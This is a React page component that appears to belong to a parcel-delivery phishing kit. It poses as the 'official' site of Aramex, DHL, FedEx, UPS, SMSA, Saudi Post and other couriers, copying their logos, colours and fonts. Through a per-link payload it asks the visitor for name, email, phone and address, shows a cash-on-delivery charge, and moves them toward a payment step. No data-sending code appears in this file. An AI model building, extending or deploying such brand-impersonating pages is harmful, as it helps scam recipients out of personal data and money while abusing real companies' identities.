import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { User, Mail, Phone, MapPin, ArrowLeft } from "lucide-react";

const PaymentRecipientOfficial = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);

  // Get amount from link data
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;
  const formattedAmount = formatCurrency(amount, countryCode);

  const validateForm = () => {
    const newErrors: Record<string, string> = {};

    if (!customerName.trim()) {
      newErrors.customerName = "يرجى إدخال اسم المستلم";
    }

    if (!customerEmail.trim()) {
      newErrors.customerEmail = "يرجى إدخال البريد الإلكتروني";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(customerEmail)) {
      newErrors.customerEmail = "يرجى إدخال بريد إلكتروني صحيح";
    }

    if (!customerPhone.trim()) {
      newErrors.customerPhone = "يرجى إدخال رقم الهاتف";
    }

    if (!residentialAddress.trim()) {
      newErrors.residentialAddress = "يرجى إدخال العنوان";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleProceed = (e: React.FormEvent) => {
    e.preventDefault();

    if (validateForm()) {
      navigate(`/pay/${id}/details`);
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  // Get company-specific styling
  const getCompanyStyles = () => {
    const styles: Record<string, any> = {
      aramex: {
        gradient: 'linear-gradient(135deg, #E31E24, #FF6B35)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF5F5 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/aramex-logo.svg',
        fontFamily: "'DIN Next', 'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(227, 30, 36, 0.25)',
        inputFocus: '#E31E24',
      },
      dhl: {
        gradient: 'linear-gradient(135deg, #FFCC00, #D40511)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF9E6 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/dhl-logo.svg',
        fontFamily: "'Helvetica', 'Arial', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(255, 204, 0, 0.25)',
        inputFocus: '#FFCC00',
      },
      fedex: {
        gradient: 'linear-gradient(135deg, #4D148C, #FF6600)',
        background: 'linear-gradient(180deg, #FFF 0%, #F5F0FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/fedex-logo.svg',
        fontFamily: "'Inter', 'Helvetica', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(77, 20, 140, 0.25)',
        inputFocus: '#4D148C',
      },
      ups: {
        gradient: 'linear-gradient(135deg, #351C15, #FFB500)',
        background: 'linear-gradient(180deg, #FFF 0%, #F5F3F2 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/ups-logo.svg',
        fontFamily: "'Arial', 'Helvetica', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(53, 28, 21, 0.25)',
        inputFocus: '#351C15',
      },
      empost: {
        gradient: 'linear-gradient(135deg, #C8102E, #003087)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF0F2 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/empost-logo.png',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(200, 16, 46, 0.25)',
        inputFocus: '#C8102E',
      },
      smsa: {
        gradient: 'linear-gradient(135deg, #0066CC, #FF6600)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0F7FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/smsa-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(0, 102, 204, 0.25)',
        inputFocus: '#0066CC',
      },
      zajil: {
        gradient: 'linear-gradient(135deg, #1C4587, #FF9900)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0F5FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/zajil-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(28, 69, 135, 0.25)',
        inputFocus: '#1C4587',
      },
      naqel: {
        gradient: 'linear-gradient(135deg, #0052A3, #FF6B00)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0F5FF 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/naqel-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(0, 82, 163, 0.25)',
        inputFocus: '#0052A3',
      },
      saudipost: {
        gradient: 'linear-gradient(135deg, #006C35, #FFB81C)',
        background: 'linear-gradient(180deg, #FFF 0%, #F0FFF4 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/saudipost-logo.png',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(0, 108, 53, 0.25)',
        inputFocus: '#006C35',
      },
    };

    return styles[serviceKey] || styles.aramex;
  };

  const companyStyles = getCompanyStyles();

  return (
    <div
      className="min-h-screen"
      style={{
        background: companyStyles.background,
        fontFamily: companyStyles.fontFamily,
      }}
    >
      {/* Official Company Header */}
      <header
        className="sticky top-0 z-50 w-full border-b"
        style={{
          backgroundColor: companyStyles.headerBg,
          borderBottomColor: companyStyles.borderColor,
          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
        }}
      >
        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <button onClick={handleBack} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <ArrowLeft className="w-5 h-5" style={{ color: companyStyles.primaryText }} />
            </button>
            <img
              src={companyStyles.logo}
              alt={serviceName}
              className="h-8 sm:h-12 w-auto object-contain"
            />
          </div>
          <div className="text-right">
            <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
              {serviceName}
            </h1>
            <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
              بيانات المستلم
            </p>
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: companyStyles.gradient,
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          {/* Progress Indicator */}
          <div
            className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
            style={{
              backgroundColor: companyStyles.cardBg,
              borderColor: companyStyles.borderColor,
            }}
          >
            <div className="flex items-center justify-between mb-3">
              <span
                className="text-sm font-semibold"
                style={{ color: companyStyles.primaryText }}
              >
                الخطوة 2 من 4
              </span>
              <span
                className="text-xs"
                style={{ color: companyStyles.secondaryText }}
              >
                {serviceName}
              </span>
            </div>
            <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-500"
                style={{
                  width: '50%',
                  background: companyStyles.gradient,
                }}
              />
            </div>
          </div>

          {/* Recipient Form */}
          <form onSubmit={handleProceed}>
            <div
              className="border rounded-xl p-6 sm:p-8 mb-6"
              style={{
                backgroundColor: companyStyles.cardBg,
                borderColor: companyStyles.borderColor,
                boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
              }}
            >
              <h2
                className="text-xl font-bold mb-2"
                style={{ color: companyStyles.primaryText }}
              >
                معلومات المستلم
              </h2>
              <p
                className="text-sm mb-6"
                style={{ color: companyStyles.secondaryText }}
              >
                أدخل بيانات الشخص الذي سيستلم الشحنة
              </p>

              <div className="space-y-5">
                {/* Full Name */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    الاسم الكامل
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      placeholder="أدخل الاسم الكامل"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      className="w-full px-4 py-3 pl-12 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2"
                      style={{
                        borderColor: errors.customerName ? '#E31837' : companyStyles.borderColor,
                        fontFamily: companyStyles.fontFamily,
                        '--tw-ring-color': companyStyles.inputFocus,
                      } as React.CSSProperties}
                    />
                    <User
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5"
                      style={{ color: companyStyles.secondaryText }}
                    />
                  </div>
                  {errors.customerName && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.customerName}
                    </p>
                  )}
                </div>

                {/* Email */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    البريد الإلكتروني
                  </label>
                  <div className="relative">
                    <input
                      type="email"
                      placeholder="example@email.com"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      className="w-full px-4 py-3 pl-12 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2"
                      style={{
                        borderColor: errors.customerEmail ? '#E31837' : companyStyles.borderColor,
                        fontFamily: companyStyles.fontFamily,
                        '--tw-ring-color': companyStyles.inputFocus,
                      } as React.CSSProperties}
                    />
                    <Mail
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5"
                      style={{ color: companyStyles.secondaryText }}
                    />
                  </div>
                  {errors.customerEmail && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.customerEmail}
                    </p>
                  )}
                </div>

                {/* Phone */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    رقم الهاتف
                  </label>
                  <div className="relative">
                    <input
                      type="tel"
                      placeholder={phonePlaceholder}
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      className="w-full px-4 py-3 pl-12 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2"
                      style={{
                        borderColor: errors.customerPhone ? '#E31837' : companyStyles.borderColor,
                        fontFamily: companyStyles.fontFamily,
                        '--tw-ring-color': companyStyles.inputFocus,
                      } as React.CSSProperties}
                    />
                    <Phone
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5"
                      style={{ color: companyStyles.secondaryText }}
                    />
                  </div>
                  {errors.customerPhone && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.customerPhone}
                    </p>
                  )}
                </div>

                {/* Address */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-2"
                    style={{ color: companyStyles.primaryText }}
                  >
                    العنوان
                  </label>
                  <div className="relative">
                    <textarea
                      placeholder="أدخل العنوان الكامل"
                      value={residentialAddress}
                      onChange={(e) => setResidentialAddress(e.target.value)}
                      rows={3}
                      className="w-full px-4 py-3 pl-12 border rounded-lg text-sm transition-all focus:outline-none focus:ring-2 resize-none"
                      style={{
                        borderColor: errors.residentialAddress ? '#E31837' : companyStyles.borderColor,
                        fontFamily: companyStyles.fontFamily,
                        '--tw-ring-color': companyStyles.inputFocus,
                      } as React.CSSProperties}
                    />
                    <MapPin
                      className="absolute left-3 top-3 w-5 h-5"
                      style={{ color: companyStyles.secondaryText }}
                    />
                  </div>
                  {errors.residentialAddress && (
                    <p className="text-xs mt-1" style={{ color: '#E31837' }}>
                      {errors.residentialAddress}
                    </p>
                  )}
                </div>

                {/* Amount Display */}
                <div
                  className="flex items-center justify-between p-4 rounded-lg border mt-6"
                  style={{
                    backgroundColor: `${branding.colors.primary}08`,
                    borderColor: companyStyles.borderColor,
                  }}
                >
                  <span
                    className="text-base font-semibold"
                    style={{ color: companyStyles.primaryText }}
                  >
                    المبلغ الإجمالي
                  </span>
                  <span
                    className="text-xl font-bold"
                    style={{ color: branding.colors.primary }}
                  >
                    {formattedAmount}
                  </span>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base"
              style={{
                background: companyStyles.gradient,
                boxShadow: companyStyles.buttonShadow,
                fontFamily: companyStyles.fontFamily,
              }}
            >
              <span>المتابعة للدفع</span>
              <ArrowLeft className="w-5 h-5" />
            </button>

            {/* Terms Notice */}
            <p
              className="text-xs text-center mt-4"
              style={{ color: companyStyles.secondaryText }}
            >
              بالمتابعة، أنت توافق على الشروط والأحكام
            </p>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PaymentRecipientOfficial;
